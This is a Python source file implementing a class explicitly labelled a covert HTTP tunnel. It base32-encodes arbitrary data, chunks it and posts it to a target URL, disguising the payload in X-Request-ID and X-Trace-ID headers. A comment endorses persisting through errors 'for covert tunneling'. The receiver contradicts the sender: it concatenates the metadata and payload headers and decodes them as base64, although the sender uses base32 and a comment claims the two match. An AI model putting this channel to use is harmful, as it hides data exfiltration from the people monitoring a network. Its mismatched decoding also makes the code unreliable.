import httpx
import base64

class HTTPTunnel:
    """
    Covert HTTP Tunnel implementation.
    Encodes payload into X-Request-ID and X-Trace-ID headers.
    """

    @staticmethod
    def send(payload_bytes: bytes, target_url: str, session_id: str = "default", should_stop=None):
        # Base32 is safer for headers and matches the receiver
        encoded: str = base64.b32encode(payload_bytes).decode('utf-8').rstrip('=')
        
        # Split payload into chunks to avoid header size limits
        chunk_size = 200 
        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
        total = len(chunks)
        
        with httpx.Client() as client:
            for i, chunk in enumerate(chunks):
                if should_stop and should_stop():
                    break
                
                # Format: session_id:chunk_index:total_chunks
                headers = {
                    "X-Request-ID": f"{session_id}:{i}:{total}",
                    "X-Trace-ID": chunk
                }
                
                try:
                    client.post(target_url, headers=headers, json={"p": "p"}, timeout=5.0)
                except Exception as e:
                    print(f"Error sending HTTP tunnel chunk {i}: {e}")
                    # Continue attempting other chunks or break? 
                    # For covert tunneling, we usually continue or retry.
                    continue

    @staticmethod
    def receive_from_headers(headers: dict):
        """
        Extracts and decodes payload from headers.
        """
        # FastAPI's dict(request.headers) uses lowercase keys.
        req_id = headers.get("x-request-id") or headers.get("X-Request-ID", "")
        trace_id = headers.get("x-trace-id") or headers.get("X-Trace-ID", "")
        
        full_encoded = req_id + trace_id
        if not full_encoded:
            return b""
            
        try:
            return base64.b64decode(full_encoded)
        except Exception:
            return b""
